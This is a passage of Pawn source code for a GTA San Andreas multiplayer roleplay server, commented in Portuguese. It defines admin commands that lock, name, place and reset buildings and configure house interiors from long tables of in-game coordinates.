			buInfo[id][ExitAngle] = 82.4349;

			buInfo[id][Interior] = 0;

			format(string, sizeof string, "Building: %d - Descrição: Câmara Municipal.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_AEROPORTO:
        {
			buInfo[id][ExitX] = -1869.0186;
			buInfo[id][ExitY] = 41.2968;
			buInfo[id][ExitZ] = 1055.1296;
			buInfo[id][ExitAngle] = 276.4877;

			buInfo[id][Interior] = 14;

			format(string, sizeof string, "Building: %d - Descrição: Aeroporto.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_NEWS:
        {
			buInfo[id][ExitX] = 248.4793;
			buInfo[id][ExitY] = 1783.6931;
			buInfo[id][ExitZ] = 700.0885;
			buInfo[id][ExitAngle] = 276.4877;

			buInfo[id][Interior] = 14;

			format(string, sizeof string, "Building: %d - Descrição: News.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_HOSPITAL2:
        {
			buInfo[id][ExitX] = 1246.1337;
			buInfo[id][ExitY] = 325.4356;
			buInfo[id][ExitZ] = -13.0416;
			buInfo[id][ExitAngle] = 276.4877;

			buInfo[id][Interior] = 14;

			format(string, sizeof string, "Building: %d - Descrição: Hospital 2.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_HOSPITAL3:
        {
			buInfo[id][ExitX] = 1144.2928;
			buInfo[id][ExitY] = -2510.8018;
			buInfo[id][ExitZ] = 113.0165;
			buInfo[id][ExitAngle] = 276.4877;

			buInfo[id][Interior] = 14;

			format(string, sizeof string, "Building: %d - Descrição: Hospital 3.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
        case BUILDING_FABRICA:
        {
			buInfo[id][ExitX] = 963.418762;
			buInfo[id][ExitY] = 2108.292480;
			buInfo[id][ExitZ] = 1011.030273;
			buInfo[id][ExitAngle] = 276.030273;
			
			buInfo[id][Interior] = 1;

			format(string, sizeof string, "Building: %d - Descrição: Fábrica.", id);
			SendClientMessage(playerid, COLOR_INFO, string);
        }
	}
	GuardarBuilding(id);
	
	return 1;
}

COMMAND:abuildinglock(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abuildinglock <id>");
    if(id <= 0 || id > (MAX_BUILDINGS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

	if(buInfo[id][Locked] == 0)
	{
        format(string, sizeof(string), "Trancaste o building %d", id);
        buInfo[id][Locked] = 1;
	}
	else
	{
        format(string, sizeof(string), "Destrancaste o building %d", id);
        buInfo[id][Locked] = 0;
	}
	GuardarBuilding(id);

    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abuildingname(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, nome[32];

    if(sscanf(params, "ds[32]", id, nome)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abuildingname <id> <nome>");
    if(id <= 0 || id > (MAX_BUILDINGS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	
	format(buInfo[id][Nome], 32, "%s", nome);

	GuardarBuilding(id);

    format(string, sizeof(string), "Setaste o nome do building %d para %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:abuildingentrance(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/abuildingentrance <id>");
    if(id <= 0 || id > (MAX_BUILDINGS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	new Float:x, Float:y, Float:z, VW, Int, Float:a;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	buInfo[id][EnterX] = x;
	buInfo[id][EnterY] = y;
 	buInfo[id][EnterZ] = z;
 	buInfo[id][EnterAngle] = a;
 	buInfo[id][EnterInterior] = Int;
 	buInfo[id][EnterVirtualWorld] = VW;
 	
	GuardarBuilding(id);

    format(string, sizeof(string), "Setaste a entrada do building %d para a tua posição", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:resetbuildings(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);

	new i, Float:distance = 6.0, Float:metres = distance, Float:a;

	for(; i < sizeof(buInfo); i++, metres += distance)
	{
	    if(i == 0) continue;

		GetPlayerPos(playerid, buInfo[i][EnterX], buInfo[i][EnterY], buInfo[i][EnterZ]);
		GetPlayerFacingAngle(playerid, a);

		buInfo[i][EnterX] += (metres * floatsin(-a, degrees));
		buInfo[i][EnterY] += (metres * floatcos(-a, degrees));
		buInfo[i][EnterInterior] = 0;
		buInfo[i][EnterVirtualWorld] = 0;
        buInfo[i][ExitX] = 0;
		buInfo[i][ExitY] = 0;
		buInfo[i][ExitZ] = 0;
		buInfo[i][ExitAngle] = 0;
		buInfo[i][Interior] = 0;
		buInfo[i][VirtualWorld] = i;
		buInfo[i][PickupID] = 1559;
  		format(buInfo[i][Nome], 32, "%s", "Unused");

		GuardarBuilding(i);
	}

    SendClientMessage(playerid, COLOR_INFO, "Deste reset a todas as buildings do servidor");

    return 1;
}

COMMAND:ahousecmds(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de CASAS:] {FFFFFF}/resethouses - /ahouseprice - /ahousedesc - /ahouseentrance");
    SendClientMessage(playerid, COLOR_CHAT, "[Comandos de CASAS:] {FFFFFF}/ahouseint - /ahouselock - /ahousesell - /agarageentrance - /ahouseconfig");
    SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");

    return 1;
}

COMMAND:ahouseconfig(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, nome[32];

    if(sscanf(params, "ds[32]", id, nome))
    {
        SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahouseconfig <id> <config>");
        SendClientMessage(playerid, COLOR_CHAT, "[Configs]: {FFFFFF}pequena - média - grande - caravana - apartamento - mansão");
        return 1;
    }
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];

 	if(strcmp(nome, "pequena", true) == 0)
    {
        hInfo[id][Price] = 85000;
        format(hInfo[id][Nome], 32, "%s", "Casa Pequena");
	}
	else if(strcmp(nome, "média", true) == 0)
	{
        hInfo[id][Price] = 165000;
		format(hInfo[id][Nome], 32, "%s", "Casa Média");
	}
	else if(strcmp(nome, "grande", true) == 0)
	{
        hInfo[id][Price] = 240000;
		format(hInfo[id][Nome], 32, "%s", "Casa Grande");
	}
	else if(strcmp(nome, "caravana", true) == 0)
	{
        hInfo[id][Price] = 30000;
		format(hInfo[id][Nome], 32, "%s", "Caravana");
	}
	else if(strcmp(nome, "apartamento", true) == 0)
	{
        hInfo[id][Price] = 45000;
		format(hInfo[id][Nome], 32, "%s", "Apartamento");
	}
	else if(strcmp(nome, "mansão", true) == 0)
	{
        hInfo[id][Price] = 650000;
		format(hInfo[id][Nome], 32, "%s", "Mansão");
	}
	
	new interior = random(46);
	
    switch(interior)
    {
        case 1:
        {
			hInfo[id][ExitX] = 235.508994;
			hInfo[id][ExitY] = 1189.169897;
			hInfo[id][ExitZ] = 1080.339966;
   			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/3 bedrooms/clone of House 9.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 2:
        {
			hInfo[id][ExitX] = 225.756989;
			hInfo[id][ExitY] = 1240.000000;
			hInfo[id][ExitZ] = 1082.149902;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 3:
        {
			hInfo[id][ExitX] = 223.043991;
			hInfo[id][ExitY] = 1289.259888;
			hInfo[id][ExitZ] = 1082.199951;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 4:
        {
			hInfo[id][ExitX] = 225.630997;
			hInfo[id][ExitY] = 1022.479980;
			hInfo[id][ExitZ] = 1084.069946;
			hInfo[id][Interior] = 7;
			format(string, sizeof string, "Casa: %d - Descrição: VERY Large/2 story/4 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 5:
        {
			hInfo[id][ExitX] = 295.138977;
			hInfo[id][ExitY] = 1474.469971;
			hInfo[id][ExitZ] = 1080.519897;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/2 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 6:
        {
			hInfo[id][ExitX] = 328.493988;
			hInfo[id][ExitY] = 1480.589966;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/2 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 7:
        {
			hInfo[id][ExitX] = 385.803986;
			hInfo[id][ExitY] = 1471.769897;
			hInfo[id][ExitZ] = 1080.209961;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom/NO BATHROOM.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 8:
        {
			hInfo[id][ExitX] = 375.971985;
			hInfo[id][ExitY] = 1417.269897;
			hInfo[id][ExitZ] = 1081.409912;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 9:
        {
			hInfo[id][ExitX] = 490.810974;
			hInfo[id][ExitY] = 1401.489990;
			hInfo[id][ExitZ] = 1080.339966;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/3 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 10:
        {
			hInfo[id][ExitX] = 447.734985;
			hInfo[id][ExitY] = 1400.439941;
			hInfo[id][ExitZ] = 1084.339966;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/1 story/2 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
		}
        case 11:
        {
			hInfo[id][ExitX] = 227.722992;
			hInfo[id][ExitY] = 1114.389893;
			hInfo[id][ExitZ] = 1081.189941;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/4 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 12:
        {
			hInfo[id][ExitX] = 260.983978;
			hInfo[id][ExitY] = 1286.549927;
			hInfo[id][ExitZ] = 1080.299927;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 13:
        {
			hInfo[id][ExitX] = 221.666992;
			hInfo[id][ExitY] = 1143.389893;
			hInfo[id][ExitZ] = 1082.679932;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom/NO BATHROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 14:
        {
			hInfo[id][ExitX] = 27.132700;
			hInfo[id][ExitY] = 1341.149902;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 10;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/2 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 15:
        {
			hInfo[id][ExitX] = -262.601990;
			hInfo[id][ExitY] = 1456.619995;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/1 bedroom/NO BATHROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 16:
        {
			hInfo[id][ExitX] = 22.778299;
			hInfo[id][ExitY] = 1404.959961;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/1 story/2 bedrooms/NO BATHROOM or DOORS!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 17:
        {
			hInfo[id][ExitX] = 140.278000;
			hInfo[id][ExitY] = 1368.979980;
			hInfo[id][ExitZ] = 1083.969971;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/4 bedrooms/NO BATHROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 18:
        {
			hInfo[id][ExitX] = 234.045990;
			hInfo[id][ExitY] = 1064.879883;
			hInfo[id][ExitZ] = 1084.309937;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/3 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 19:
        {
			hInfo[id][ExitX] = -68.294098;
			hInfo[id][ExitY] = 1353.469971;
			hInfo[id][ExitZ] = 1080.279907;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/NO BEDROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 20:
        {
			hInfo[id][ExitX] = -285.548981;
			hInfo[id][ExitY] = 1470.979980;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: 1 bedroom/living room/kitchen/NO BATHROOM", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 21:
        {
			hInfo[id][ExitX] = -42.581997;
			hInfo[id][ExitY] = 1408.109985;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 8;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/NO BEDROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 22:
        {
			hInfo[id][ExitX] = 83.345093;
			hInfo[id][ExitY] = 1324.439941;
			hInfo[id][ExitZ] = 1083.889893;
			hInfo[id][Interior] = 9;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/2 story/2 bedrooms", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 23:
        {
			hInfo[id][ExitX] = 260.941986;
			hInfo[id][ExitY] = 1238.509888;
			hInfo[id][ExitZ] = 1084.259888;
			hInfo[id][Interior] = 9;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 24:
        {
			hInfo[id][ExitX] = 244.411987;
			hInfo[id][ExitY] = 305.032990;
			hInfo[id][ExitZ] = 999.231995;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: Denise's Bedroom", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 25:
        {
			hInfo[id][ExitX] = 271.884979;
			hInfo[id][ExitY] = 306.631989;
			hInfo[id][ExitZ] = 999.325989;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Katie's Bedroom", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 26:
        {
			hInfo[id][ExitX] = 291.282990;
			hInfo[id][ExitY] = 310.031982;
			hInfo[id][ExitZ] = 999.154968;
			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: Helena's Bedroom (barn) - limited movement.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 27:
        {
			hInfo[id][ExitX] = 302.181000;
			hInfo[id][ExitY] = 300.722992;
			hInfo[id][ExitZ] = 999.231995;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Michelle's Bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 28:
        {
			hInfo[id][ExitX] = 322.197998;
			hInfo[id][ExitY] = 302.497986;
			hInfo[id][ExitZ] = 999.231995;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Barbara's Bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 29:
        {
			hInfo[id][ExitX] = 346.870025;
			hInfo[id][ExitY] = 309.259033;
			hInfo[id][ExitZ] = 999.155700;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Millie's Bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 30:
        {
			hInfo[id][ExitX] = 2496.049805;
			hInfo[id][ExitY] = -1693.929932;
			hInfo[id][ExitZ] = 1014.750000;
			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: CJ's Mom's House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 31:
        {
			hInfo[id][ExitX] = 1263.079956;
			hInfo[id][ExitY] = -785.308960;
			hInfo[id][ExitZ] = 1091.959961;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Madd Dogg's Mansion (West door).", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 32:
        {
			hInfo[id][ExitX] = 2464.109863;
			hInfo[id][ExitY] = -1698.659912;
			hInfo[id][ExitZ] = 1013.509949;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Ryder's house.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 33:
        {
			hInfo[id][ExitX] = 2526.459961;
			hInfo[id][ExitY] = -1679.089966;
			hInfo[id][ExitZ] = 1015.500000;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: Sweet's House (South side of house is fucked).", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 34:
        {
			hInfo[id][ExitX] = 2543.659912;
			hInfo[id][ExitY] = -1303.629883;
			hInfo[id][ExitZ] = 1025.069946;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Big Smoke's Crack Factory (Ground Floor).", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 35:
        {
			hInfo[id][ExitX] = 744.542969;
			hInfo[id][ExitY] = 1437.669922;
			hInfo[id][ExitZ] = 1102.739990;
			hInfo[id][Interior] = 6;
			format(string, sizeof string, "Casa: %d - Descrição: Fanny Batter's Whore House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 36:
        {
			hInfo[id][ExitX] = 964.106995;
			hInfo[id][ExitY] = -53.205498;
			hInfo[id][ExitZ] = 1001.179993;
			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: Tiger Skin Rug Brothel.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 37:
        {
			hInfo[id][ExitX] = 2350.339844;
			hInfo[id][ExitY] = -1181.649902;
			hInfo[id][ExitZ] = 1028.000000;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Burning Desire Gang House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 38:
        {
			hInfo[id][ExitX] = 2807.619873;
			hInfo[id][ExitY] = -1171.899902;
			hInfo[id][ExitZ] = 1025.579956;
			hInfo[id][Interior] = 8;
			format(string, sizeof string, "Casa: %d - Descrição: Colonel Furhberger's House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 39:
        {
			hInfo[id][ExitX] = 318.564972;
			hInfo[id][ExitY] = 1118.209961;
			hInfo[id][ExitZ] = 1083.979980;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Crack Den.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 40:
        {
			hInfo[id][ExitX] = 2324.419922;
			hInfo[id][ExitY] = -1147.539917;
			hInfo[id][ExitZ] = 1050.719971;
			hInfo[id][Interior] = 12;
			format(string, sizeof string, "Casa: %d - Descrição: Unused Safe House.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 41:
        {
			hInfo[id][ExitX] = 446.622986;
			hInfo[id][ExitY] = 509.318970;
			hInfo[id][ExitZ] = 1001.419983;
			hInfo[id][Interior] = 12;
			format(string, sizeof string, "Casa: %d - Descrição: Budget Inn Motel Room.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 42:
        {
			hInfo[id][ExitX] = 2216.339844;
			hInfo[id][ExitY] = -1150.509888;
			hInfo[id][ExitZ] = 1025.799927;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Jefferson Motel. (REALLY EXPENSIVE)", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 43:
        {
			hInfo[id][ExitX] = 1451.8270;
			hInfo[id][ExitY] = 2458.4133;
			hInfo[id][ExitZ] = -27.7464;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: TENDA", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 44:
        {
			hInfo[id][ExitX] = 2392.7415;
			hInfo[id][ExitY] = -1714.5696;
			hInfo[id][ExitZ] = -46.7258;
			hInfo[id][Interior] = 0;
			format(string, sizeof string, "Casa: %d - Descrição: Caravana - Journey", id);
			SendClientMessage(playerid, COLOR_INFO,string);
		}
        case 45:
        {
			hInfo[id][ExitX] = 1612.906738;
			hInfo[id][ExitY] = 613.277405;
			hInfo[id][ExitZ] = 2.310597;
			hInfo[id][Interior] = 0;
			format(string, sizeof string, "Casa: %d - Descrição: Caravana - Tropic", id);
			SendClientMessage(playerid, COLOR_INFO,string);
		}
    }

	GuardarCasa(id);
	AtualizarCasa(id);

    format(string, sizeof(string), "Configuraste a casa %d automaticamente com a config %s", id, nome);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:agarageentrance(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id;

    if(sscanf(params, "d", id)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahouseentrance <id>");
    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");

	new string[128];
	new Float:x, Float:y, Float:z, VW, Int, Float:a;

	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	VW = GetPlayerVirtualWorld(playerid);
	Int = GetPlayerInterior(playerid);

	hInfo[id][GaragemEnterX] = x;
	hInfo[id][GaragemEnterY] = y;
 	hInfo[id][GaragemEnterZ] = z;
 	hInfo[id][GaragemEnterInterior] = Int;
 	hInfo[id][GaragemEnterVirtualWorld] = VW;
 	
	GuardarCasa(id);
	AtualizarCasa(id);

    format(string, sizeof(string), "Setaste a entrada da garagem %d para a tua posição", id);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:ahouseint(playerid, params[], help)
{
    if(pInfo[playerid][Admin] < 5) return SendClientMessage(playerid, -1, MSG_NOADMIN);

    new id, interior;

    if(sscanf(params, "dd", id, interior)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ahouseint <id> <interior>");

    if(id <= 0 || id > (MAX_CASAS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
    if(interior < 0 || interior > 45) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Interior inválido");

    new string[64];

    switch(interior)
    {
        case 1:
        {
			hInfo[id][ExitX] = 235.508994;
			hInfo[id][ExitY] = 1189.169897;
			hInfo[id][ExitZ] = 1080.339966;
   			hInfo[id][Interior] = 3;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/3 bedrooms/clone of House 9.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 2:
        {
			hInfo[id][ExitX] = 225.756989;
			hInfo[id][ExitY] = 1240.000000;
			hInfo[id][ExitZ] = 1082.149902;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 3:
        {
			hInfo[id][ExitX] = 223.043991;
			hInfo[id][ExitY] = 1289.259888;
			hInfo[id][ExitZ] = 1082.199951;
			hInfo[id][Interior] = 1;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 4:
        {
			hInfo[id][ExitX] = 225.630997;
			hInfo[id][ExitY] = 1022.479980;
			hInfo[id][ExitZ] = 1084.069946;
			hInfo[id][Interior] = 7;
			format(string, sizeof string, "Casa: %d - Descrição: VERY Large/2 story/4 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 5:
        {
			hInfo[id][ExitX] = 295.138977;
			hInfo[id][ExitY] = 1474.469971;
			hInfo[id][ExitZ] = 1080.519897;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/2 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 6:
        {
			hInfo[id][ExitX] = 328.493988;
			hInfo[id][ExitY] = 1480.589966;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/2 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 7:
        {
			hInfo[id][ExitX] = 385.803986;
			hInfo[id][ExitY] = 1471.769897;
			hInfo[id][ExitZ] = 1080.209961;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom/NO BATHROOM.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 8:
        {
			hInfo[id][ExitX] = 375.971985;
			hInfo[id][ExitY] = 1417.269897;
			hInfo[id][ExitZ] = 1081.409912;
			hInfo[id][Interior] = 15;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 9:
        {
			hInfo[id][ExitX] = 490.810974;
			hInfo[id][ExitY] = 1401.489990;
			hInfo[id][ExitZ] = 1080.339966;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/3 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 10:
        {
			hInfo[id][ExitX] = 447.734985;
			hInfo[id][ExitY] = 1400.439941;
			hInfo[id][ExitZ] = 1084.339966;
			hInfo[id][Interior] = 2;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/1 story/2 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
		}
        case 11:
        {
			hInfo[id][ExitX] = 227.722992;
			hInfo[id][ExitY] = 1114.389893;
			hInfo[id][ExitZ] = 1081.189941;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/4 bedrooms.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 12:
        {
			hInfo[id][ExitX] = 260.983978;
			hInfo[id][ExitY] = 1286.549927;
			hInfo[id][ExitZ] = 1080.299927;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 13:
        {
			hInfo[id][ExitX] = 221.666992;
			hInfo[id][ExitY] = 1143.389893;
			hInfo[id][ExitZ] = 1082.679932;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Small/1 story/1 bedroom/NO BATHROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 14:
        {
			hInfo[id][ExitX] = 27.132700;
			hInfo[id][ExitY] = 1341.149902;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 10;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/2 story/1 bedroom.", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 15:
        {
			hInfo[id][ExitX] = -262.601990;
			hInfo[id][ExitY] = 1456.619995;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 4;
			format(string, sizeof string, "Casa: %d - Descrição: Large/2 story/1 bedroom/NO BATHROOM!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 16:
        {
			hInfo[id][ExitX] = 22.778299;
			hInfo[id][ExitY] = 1404.959961;
			hInfo[id][ExitZ] = 1084.449951;
			hInfo[id][Interior] = 5;
			format(string, sizeof string, "Casa: %d - Descrição: Medium/1 story/2 bedrooms/NO BATHROOM or DOORS!", id);
			SendClientMessage(playerid, COLOR_INFO,string);
        }
        case 17:
        {
			hInfo[id][ExitX] = 140.278000;
			hInfo[id][ExitY] = 1368.979980;
